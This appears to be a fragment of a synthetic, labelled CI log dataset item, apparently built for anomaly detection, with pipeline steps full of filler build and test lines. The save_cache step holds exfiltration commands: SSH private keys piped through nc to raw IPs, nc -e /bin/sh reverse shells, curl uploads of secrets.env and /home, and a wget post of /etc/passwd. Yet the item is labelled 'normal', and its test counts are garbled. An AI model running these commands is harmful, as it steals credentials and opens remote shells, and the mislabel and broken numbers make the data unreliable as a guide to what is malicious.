          "Pulling image: node:latest",
          "yarn add: Done in 30.73s",
          "[12:20:10] INFO: Request completed",
          "Optimizing 31 modules...",
          "Building Docker image...",
          "[12:20:10] INFO: Connecting to database",
          "pip: Downloading jest-5.14.tar.gz",
          "Cache invalidated: dependencies",
          "Artifact uploaded: dist.zip (72MB)",
          "OK",
          "Connection established",
          "Step 12/21: Running migrations",
          "Loading...",
          "pip: Downloading webpack-2.6.tar.gz",
          "Test Suites: 39 passed, 16 total",
          "Step 10/25: Building",
          "Loading...",
          "POST /api - 201 (96ms)",
          "Compiling components/utils.go...",
          "Loading...",
          "Cache miss for key-4653",
          "Connection established",
          "Connecting to acme.corp:443...",
          "Uploading artifact 'coverage' (26 files)",
          "npm install: added 348 packages",
          "Step 6/15: Testing",
          "[12:20:10] WARN: Deprecated API usage",
          "[12:20:10] INFO: Starting build process",
          "Loading...",
          "[12:20:10] INFO: Connecting to database",
          "yarn add: Done in 20.78s",
          "Compiling lib/app.ts...",
          "Using Node.js 20.1.4",
          "[12:20:10] DEBUG: Memory usage: 667MB",
          "Cache saved successfully",
          "Installing react@1.11.5",
          "Layer 4/10: RUN command",
          "WARNING: react has known vulnerabilities",
          "yarn add: Done in 19.61s",
          "[12:20:10] DEBUG: Loading configuration",
          "Layer 1/14: RUN command",
          "Tests: 223 passed, 275 total",
          "Environment: production",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-30T12:22:18.114339",
        "finished_at": "2025-11-30T12:22:27.625989",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:20:10] ERROR: Connection failed",
          "[12:20:10] ERROR: Connection failed",
          "Completed.",
          "Artifact uploaded: dist.zip (19MB)",
          "Step 18/22: Running migrations",
          "  PASS: test_cache_hit (19ms)",
          "Optimizing 75 modules...",
          "Processing...",
          "Verifying...",
          "WARNING: express has known vulnerabilities",
          "[12:20:10] INFO: Connecting to database",
          "GET /health - 204 (71ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "npm notice: created a lockfile",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting axios",
          "Fetching submodules...",
          "Already up to date.",
          "[12:20:10] INFO: Starting build process",
          "Checking out main branch",
          "Step 13/25: Linting",
          "NODE_ENV=test",
          "Step 10/23: Building",
          "Connection established",
          "Platform: linux-x64",
          "[12:20:10] INFO: Starting build process",
          "Cache invalidated: node_modules",
          "Compiling lib/handler.rs...",
          "Cache restored successfully (309MB)",
          "Step 4/19: Installing dependencies",
          "[12:20:10] INFO: Request completed",
          "Step 10/21: Running migrations",
          "Finished.",
          "[12:20:10] INFO: Request completed",
          "Step 19/19: Deploying",
          "Step 16/17: Building",
          "Artifact uploaded: dist.zip (92MB)",
          "pip: Collecting webpack",
          "Compiling src/main.py...",
          "Pulling image: python:3.11",
          "Compiling components/main.py...",
          "Creating production build...",
          "Snapshots: 36 passed, 40 total",
          "Step 6/24: Deploying",
          "Optimizing 40 modules...",
          "Installing lodash@4.20.8",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-30T12:22:27.625989",
        "finished_at": "2025-11-30T12:22:37.137639",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Generating source maps...",
          "Bundling vendor.js",
          "[12:20:10] DEBUG: Memory usage: 1739MB",
          "[12:20:10] INFO: Request completed",
          "Switched to branch 'bugfix/task-517'",
          "Pushing to registry...",
          "Uploading artifact 'coverage' (2 files)",
          "Building Docker image...",
          "[12:20:10] DEBUG: Loading configuration",
          "Cache miss for key-1052",
          "[12:20:10] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Compiling utils/service.java...",
          "[12:20:10] ERROR: Connection failed",
          "Success!",
          "Platform: darwin-arm64",
          "Using Node.js 17.20.6",
          "Transforming 598 files...",
          "Minifying vendor.js",
          "Step 16/17: Deploying",
          "[12:20:10] INFO: Cache refreshed",
          "Step 6/19: Installing dependencies",
          "[12:20:10] DEBUG: Connection pool: 10 active",
          "Cache invalidated: dependencies",
          "Platform: darwin-arm64",
          "npm install: resolved 1550 packages",
          "Coverage: 72% statements, 64% branches",
          "npm notice: package.json updated",
          "Ready.",
          "Connecting to test.io:443...",
          "Fetching submodules...",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-7232",
          "[12:20:10] DEBUG: Connection pool: 18 active",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "TLS handshake completed",
          "Cache miss for key-6323",
          "[12:20:10] DEBUG: Connection pool: 7 active",
          "Artifact downloaded: 27MB",
          "Artifact downloaded: 44MB",
          "Installing lodash@4.5.10",
          "TLS handshake completed",
          "Snapshots: 43 passed, 48 total",
          "[12:20:10] INFO: Processing request",
          "Loading...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-30T12:22:37.137639",
        "finished_at": "2025-11-30T12:22:40.942299",
        "log_lines": [
          "=== Step: checkout ===",
          "Exception: RuntimeError",
          "[12:20:10] DEBUG: Initializing service",
          "Checking out main branch",
          "pip install: Successfully installed axios-2.0",
          "\u2713 deploy completed",
          "Completed.",
          "Success!",
          "Installing react@5.9.10",
          "[12:20:10] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "TLS handshake completed",
          "\u2713 Task completed in 2201ms",
          "Optimizing 64 modules...",
          "Artifact downloaded: 27MB",
          "Step 5/15: Testing",
          "Connection established",
          "[12:20:10] INFO: Processing request",
          "Waiting...",
          "pip install: Successfully installed eslint-2.2",
          "pip: Downloading lodash-2.6.tar.gz",
          "Tests: 345 passed, 61 total",
          "\u2713 Task completed in 4241ms",
          "Connection established",
          "Cache restored successfully (149MB)",
          "Using Node.js 14.19.8",
          "  PASS: e2e/test_cache_hit.spec.js",
          "GET /status - 204 (69ms)",
          "Bundling styles.css",
          "pip install: Successfully installed webpack-4.3",
          "[12:20:10] INFO: Cache refreshed",
          "Bundling styles.js",
          "Artifact uploaded: dist.zip (26MB)",
          "Artifact downloaded: 15MB",
          "Ready.",
          "Transforming 438 files...",
          "Completed.",
          "Generating source maps...",
          "Verifying...",
          "Processing...",
          "[12:20:10] DEBUG: Query executed in 15ms",
          "[12:20:10] INFO: Processing request",
          "Installing react@5.6.9",
          "Transforming 808 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 108.382s",
          "Building Docker image...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-30T12:22:40.942299",
        "finished_at": "2025-11-30T12:22:50.453949",
        "log_lines": [
          "=== Step: lint ===",
          "Verifying...",
          "[12:20:10] DEBUG: Connection pool: 6 active",
          "\u2717 build failed with exit code 124",
          "[12:20:10] INFO: Request completed",
          "Verifying...",
          "Image pulled successfully",
          "Transforming 505 files...",
          "[12:20:10] WARN: Deprecated API usage",
          "Time: 52.511s",
          "Compiling lib/service.java...",
          "[12:20:10] WARN: Deprecated API usage",
          "Ran 163 tests in 8s",
          "Cache saved successfully",
          "Step 18/25: Installing dependencies",
          "Generating source maps...",
          "Ready.",
          "Pushing to registry...",
          "Ran 81 tests in 54s",
          "WARNING: jest has known vulnerabilities",
          "Success!",
          "[12:20:10] DEBUG: Query executed in 51ms",
          "Verifying...",
          "Step 6/25: Running migrations",
          "Processing...",
          "yarn add: Done in 21.22s",
          "Fetching submodules...",
          "HEAD is now at 3148647",
          "Step 8/18: Running migrations",
          "[12:20:10] INFO: Cache refreshed",
          "Compiling utils/index.js...",
          "Step 3/18: Installing dependencies",
          "  PASS: integration/test_api_health.spec.js",
          "HEAD is now at 1a1f39f",
          "POST /data - 200 (235ms)",
          "Already up to date.",
          "Cache saved successfully",
          "GET /status - 204 (69ms)",
          "Processing...",
          "Already up to date.",
          "Cache invalidated: node_modules",
          "Step 8/23: Building",
          "OK",
          "Cache invalidated: build",
          "\u2713 All checks passed",
          "OK",
          "Coverage: 79% statements, 66% branches",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-30T12:22:50.453949",
        "finished_at": "2025-11-30T12:22:59.965599",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Loading...",
          "Cache saved successfully",
          "Waiting...",
          "Layer 2/10: RUN command",
          "Test Suites: 19 passed, 8 total",
          "Snapshots: 25 passed, 39 total",
          "Step 1/20: Testing",
          "pip: Collecting lodash",
          "Processing...",
          "Connecting to example.com:443...",
          "[12:20:10] INFO: Cache refreshed",
          "Snapshots: 16 passed, 6 total",
          "[12:20:10] DEBUG: Initializing service",
          "Verifying...",
          "Pushing to registry...",
          "Already up to date.",
          "Done.",
          "pip install: Successfully installed eslint-3.9",
          "Step 5/25: Installing dependencies",
          "NODE_ENV=test",
          "[12:20:10] WARN: Deprecated API usage",
          "\u2713 Task completed in 2493ms",
          "Cache miss for key-6077",
          "HEAD is now at 15bfbb3",
          "Installing jest@1.5.10",
          "[12:20:10] INFO: Starting build process",
          "Cache invalidated: node_modules",
          "  PASS: test_cache_hit (142ms)",
          "  PASS: test_auth_login (448ms)",
          "Compiling src/utils.go...",
          "Step 15/17: Installing dependencies",
          "Uploading artifact 'build' (17 files)",
          "Environment: test",
          "Snapshots: 3 passed, 28 total",
          "npm install: resolved 1021 packages",
          "Step 19/20: Installing dependencies",
          "npm install: resolved 521 packages",
          "Compiling utils/app.ts...",
          "[12:20:10] DEBUG: Initializing service",
          "Compiling lib/handler.rs...",
          "[12:20:10] INFO: Cache refreshed",
          "yarn add: Done in 28.74s",
          "Exception: TypeError",
          "\u2713 build completed",
          "Artifact downloaded: 7MB",
          "npm notice: created a lockfile",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-30T12:22:59.965599",
        "finished_at": "2025-11-30T12:23:09.477249",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:20:10] WARN: Deprecated API usage",
          "Cache restored successfully (288MB)",
          "yarn add: Done in 12.43s",
          "Minifying main.js",
          "Using Python 3.9",
          "Finished.",
          "pip: Collecting react",
          "Compiling components/service.java...",
          "Coverage: 92% statements, 76% branches",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-436'",
          "[12:20:10] WARN: Deprecated API usage",
          "Test Suites: 19 passed, 9 total",
          "NODE_ENV=test",
          "Step 9/25: Linting",
          "Already up to date.",
          "Coverage: 75% statements, 92% branches",
          "HEAD is now at f13fd84",
          "TLS handshake completed",
          "Step 18/16: Building",
          "[12:20:10] INFO: Request completed",
          "Uploading artifact 'dist' (19 files)",
          "Success!",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Verifying...",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Uploading artifact 'build' (17 files)",
          "HEAD is now at 614957b",
          "POST /upload - 201 (318ms)",
          "Done.",
          "HEAD is now at e84cff2",
          "[12:20:10] INFO: Processing request",
          "\u2713 Step 'install' succeeded",
          "\u2717 build failed with exit code 115",
          "Success!",
          "Tests: 248 passed, 466 total",
          "Generating source maps...",
          "Verifying...",
          "Using Python 3.12",
          "Compiling lib/main.py...",
          "npm notice: package.json updated",
          "Exception: RuntimeError",
          "[12:20:10] WARN: Deprecated API usage",
          "Artifact downloaded: 20MB",
          "Cache invalidated: dependencies",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-30T12:23:09.477249",
        "finished_at": "2025-11-30T12:23:15.184239",
        "log_lines": [
          "=== Step: save_cache ===",
          "Environment: test",
          "Cache invalidated: build",
          "[12:20:10] INFO: Cache refreshed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 90.4.224.183 11374",
          "  PASS: test_auth_login (167ms)",
          "Environment: staging",
          "Step 4/20: Deploying",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Already up to date.",
          "Generating source maps...",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "WARNING: axios has known vulnerabilities",
          "Verifying...",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Minifying vendor.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Artifact downloaded: 11MB",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 64.100.169.214 54702",
          "nc -e /bin/sh 122.33.162.135 33808",
          "Using Node.js 17.18.4",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 40.101.114.226 1521",
          "Fetching submodules...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 40.137.118.246 35212",
          "\u2713 build completed",
          "[12:20:10] DEBUG: Initializing service",
          "  PASS: test_api_health (477ms)",
          "\u2717 build failed with exit code 52",
          "Layer 5/8: RUN command",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 83% statements, 91% branches",
          "Coverage: 70% statements, 78% branches",
          "Finished.",
          "Environment: development",
          "pip install: Successfully installed prettier-5.7",
          "Building Docker image...",
          "Verifying...",
          "[12:20:10] DEBUG: Query executed in 23ms",
          "npm install: resolved 1716 packages",
          "Ready.",
          "nc -e /bin/sh 155.117.252.174 56286",
          "Sending 468MB of data to example.com",
          "[12:20:10] INFO: Cache refreshed",
          "Transforming 900 files...",
          "[12:20:10] INFO: Cache refreshed",
          "[12:20:10] INFO: Request completed",
          "Pulling image: node:18",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 1.139.86.197 17351",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 20/21: Building",
          "Done.",
          "FAILED: test_user_create",
          "Sending 285MB of data to acme.corp",
          "Artifact uploaded: build.tar.gz (37MB)",
          "WARNING: jest has known vulnerabilities",
          "Step 11/20: Installing dependencies",
          "Sending 331MB of data to startup.dev",
          "Already up to date.",
          "TLS handshake completed",
          "[12:20:10] INFO: Processing request",
          "Pushing to registry...",
          "=== Step save_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}